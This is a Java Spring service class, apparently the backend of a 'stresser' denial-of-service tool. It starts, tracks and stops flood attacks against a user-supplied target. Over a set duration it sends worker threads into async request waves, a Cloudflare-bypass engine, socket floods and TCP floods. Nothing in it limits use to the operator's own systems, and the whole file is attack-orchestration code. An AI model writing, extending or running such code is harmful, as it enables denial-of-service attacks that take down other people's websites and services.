package com.stresser.service;

import com.stresser.engine.*;
import com.stresser.model.*;
import org.springframework.stereotype.Service;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

@Service
public class AttackService {
    
    private final AsyncEngine asyncEngine = new AsyncEngine();
    private final CFBypassEngine cfEngine = new CFBypassEngine();
    private final SocketEngine socketEngine = new SocketEngine();
    
    private final ConcurrentHashMap<String, AttackStats> activeAttacks = new ConcurrentHashMap<>();
    private final ConcurrentHashMap<String, AtomicBoolean> attackFlags = new ConcurrentHashMap<>();
    private final ExecutorService executorService = Executors.newCachedThreadPool();
    
    public String startAttack(AttackRequest request) {
        String attackId = generateAttackId();
        AttackStats stats = new AttackStats();
        stats.setStartTime(System.currentTimeMillis());
        stats.setRunning(true);
        
        activeAttacks.put(attackId, stats);
        attackFlags.put(attackId, new AtomicBoolean(true));
        
        executorService.submit(() -> executeAttack(attackId, request, stats));
        
        return attackId;
    }
    
    public void stopAttack(String attackId) {
        AtomicBoolean flag = attackFlags.get(attackId);
        if (flag != null) {
            flag.set(false);
        }
        
        AttackStats stats = activeAttacks.get(attackId);
        if (stats != null) {
            stats.setRunning(false);
        }
    }
    
    public AttackStats getStats(String attackId) {
        return activeAttacks.get(attackId);
    }
    
    private void executeAttack(String attackId, AttackRequest request, AttackStats stats) {
        AtomicBoolean running = attackFlags.get(attackId);
        long endTime = System.currentTimeMillis() + (request.getDuration() * 1000L);
        
        ExecutorService workers = Executors.newFixedThreadPool(request.getThreads());
        
        while (running.get() && System.currentTimeMillis() < endTime) {
            // Async workers
            for (int i = 0; i < request.getThreads() / 3; i++) {
                workers.submit(() -> {
                    if (running.get()) {
                        asyncEngine.executeAsyncWave(request.getTarget(), 300, stats);
                    }
                });
            }
            
            // CF workers
            for (int i = 0; i < request.getThreads() / 4; i++) {
                workers.submit(() -> {
                    if (running.get()) {
                        cfEngine.executeCFAttack(request.getTarget(), stats);
                    }
                });
            }
            
            // Socket workers
            for (int i = 0; i < request.getThreads() / 3; i++) {
                workers.submit(() -> {
                    if (running.get()) {
                        socketEngine.executeSocketFlood(request.getTarget(), 30, stats);
                    }
                });
            }
            
            // TCP workers
            for (int i = 0; i < request.getThreads() / 4; i++) {
                workers.submit(() -> {
                    if (running.get()) {
                        socketEngine.executeTCPFlood(request.getTarget(), 25, stats);
                    }
                });
            }
            
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                break;
            }
        }
        
        workers.shutdown();
        try {
            workers.awaitTermination(10, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            workers.shutdownNow();
        }
        
        stats.setRunning(false);
        running.set(false);
    }
    
    private String generateAttackId() {
        return "attack_" + System.currentTimeMillis() + "_" + ThreadLocalRandom.current().nextInt(10000);
    }
}
